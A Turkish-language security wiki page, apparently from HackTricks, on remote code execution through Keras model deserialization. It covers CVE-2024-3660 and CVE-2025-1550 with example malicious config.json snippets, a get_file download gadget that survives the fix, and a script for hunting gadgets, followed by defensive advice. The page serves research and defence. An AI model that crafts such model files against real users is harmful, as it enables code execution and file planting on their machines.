# Keras Model Deserialization RCE ve Gadget Avcılığı

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Keras model deserialization pipeline'ına karşı pratik istismar tekniklerini özetler, yerel .keras formatının iç yapısını ve saldırı yüzeyini açıklar ve Model Dosyası Zafiyetleri (MFV'ler) ve düzeltme sonrası gadget'lar bulmak için bir araştırmacı araç seti sağlar.

## .keras model formatı iç yapısı

Bir .keras dosyası, en azından şunları içeren bir ZIP arşividir:
- metadata.json – genel bilgi (örn., Keras versiyonu)
- config.json – model mimarisi (birincil saldırı yüzeyi)
- model.weights.h5 – HDF5 formatında ağırlıklar

config.json, özyinelemeli deserialization'ı yönlendirir: Keras modülleri içe aktarır, sınıfları/fonksiyonları çözer ve katmanları/nesneleri saldırgan kontrolündeki sözlüklerden yeniden oluşturur.

Dense katman nesnesi için örnek kod parçası:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization şunları gerçekleştirir:
- Modül içe aktarma ve modül/sınıf_adı anahtarlarından sembol çözümü
- saldırgan kontrolündeki kwargs ile from_config(...) veya yapıcı çağrısı
- İç içe nesnelere (aktivasyonlar, başlatıcılar, kısıtlamalar vb.) geri dönüş

Tarihsel olarak, bu, config.json'u oluşturan bir saldırgana üç ilke sunmuştur:
- Hangi modüllerin içe aktarılacağını kontrol etme
- Hangi sınıf/fonksiyonların çözüleceğini kontrol etme
- Yapıcılara/from_config'e geçirilen kwargs'ı kontrol etme

## CVE-2024-3660 – Lambda-layer bytecode RCE

Kök neden:
- Lambda.from_config() python_utils.func_load(...) kullanıyordu, bu da saldırgan baytları üzerinde base64 çözümleme yapar ve marshal.loads() çağırır; Python unmarshalling kodu çalıştırabilir.

Sömürü fikri (config.json'da basitleştirilmiş yük):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras varsayılan olarak safe_mode=True uygular. Lambda'daki serileştirilmiş Python fonksiyonları, kullanıcı açıkça safe_mode=False seçeneğini seçmedikçe engellenir.

Notes:
- Eski formatlar (daha eski HDF5 kayıtları) veya eski kod tabanları modern kontrolleri zorunlu kılmayabilir, bu nedenle "gerileme" tarzı saldırılar, kurbanlar eski yükleyiciler kullandığında hala geçerli olabilir.

## CVE-2025-1550 – Keras ≤ 3.8'de Rastgele modül içe aktarma

Root cause:
- _retrieve_class_or_fn, config.json'dan saldırgan kontrolündeki modül dizeleri ile kısıtlanmamış importlib.import_module() kullandı.
- Etki: Herhangi bir yüklü modülün (veya saldırgan tarafından sys.path'e yerleştirilen modülün) rastgele içe aktarımı. İçe aktarma zamanı kodu çalışır, ardından saldırgan kwargs ile nesne oluşturma gerçekleşir.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Güvenlik iyileştirmeleri (Keras ≥ 3.9):
- Modül izin listesi: ithalatlar resmi ekosistem modülleriyle sınırlıdır: keras, keras_hub, keras_cv, keras_nlp
- Güvenli mod varsayılan: safe_mode=True, güvensiz Lambda serileştirilmiş işlev yüklemelerini engeller
- Temel tür kontrolü: serileştirilmiş nesneler beklenen türlerle eşleşmelidir

## İzin listesi içindeki post-fix gadget yüzeyi

İzin listesi ve güvenli mod ile bile, izin verilen Keras çağrılarda geniş bir yüzey kalmaktadır. Örneğin, keras.utils.get_file, kullanıcı tarafından seçilebilen konumlara rastgele URL'ler indirebilir.

İzin verilen bir işlevi referans alan Lambda aracılığıyla gadget (serileştirilmiş Python bytecode değil):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Önemli sınırlama:
- Lambda.call(), hedef çağrılabilir nesneyi çağırırken giriş tensörünü ilk konumsal argüman olarak ekler. Seçilen gadget'lar, ek bir konumsal argümanı tolere etmelidir (veya *args/**kwargs kabul etmelidir). Bu, hangi fonksiyonların geçerli olduğunu kısıtlar.

Beyaz listeye alınmış gadget'ların potansiyel etkileri:
- Keyfi indirme/yazma (yol yerleştirme, yapılandırma zehirleme)
- Ortama bağlı olarak ağ geri çağırmaları/SSRF benzeri etkiler
- Yazılan yollar daha sonra içe aktarılırsa/çalıştırılırsa veya PYTHONPATH'e eklenirse veya yazılabilir bir yazma üzerinde yürütme yeri varsa kod yürütmeye zincirleme

## Araştırmacı araç seti

1) İzin verilen modüllerde sistematik gadget keşfi

Keras, keras_nlp, keras_cv, keras_hub üzerindeki aday çağrılabilirleri sıralayın ve dosya/ağ/proses/çevre yan etkileri olanları önceliklendirin.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Doğrudan deserialization testi (no .keras archive needed)

Keras deserializer'larına hazırlanmış dict'leri doğrudan besleyerek kabul edilen parametreleri öğrenin ve yan etkileri gözlemleyin.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sürüm arası sorgulama ve formatlar

Keras, farklı koruma önlemleri ve formatlarla birden fazla kod tabanında/çağda mevcuttur:
- TensorFlow yerleşik Keras: tensorflow/python/keras (eski, silinmesi planlanıyor)
- tf-keras: ayrı olarak sürdürülüyor
- Çoklu arka uç Keras 3 (resmi): yerel .keras tanıtıldı

Kod tabanları ve formatlar (.keras vs eski HDF5) arasında testleri tekrarlayarak gerilemeleri veya eksik korumaları ortaya çıkarın.

## Savunma önerileri

- Model dosyalarını güvenilmeyen girdi olarak değerlendirin. Sadece güvenilir kaynaklardan modeller yükleyin.
- Keras'ı güncel tutun; allowlisting ve tür kontrollerinden yararlanmak için Keras ≥ 3.9 kullanın.
- Modelleri yüklerken safe_mode=False ayarlamayın, dosyaya tamamen güvenmiyorsanız.
- Ağa çıkışı olmayan ve sınırlı dosya sistemi erişimi olan bir sandbox ortamında serileştirmeyi çalıştırmayı düşünün.
- Model kaynakları için allowlistler/imzalar ve mümkünse bütünlük kontrolü uygulayın.

## Referanslar

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Serialization için kontroller eklendi](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda serileştirme RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras rastgele modül içe aktarma (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr raporu – rastgele içe aktarma #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr raporu – rastgele içe aktarma #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
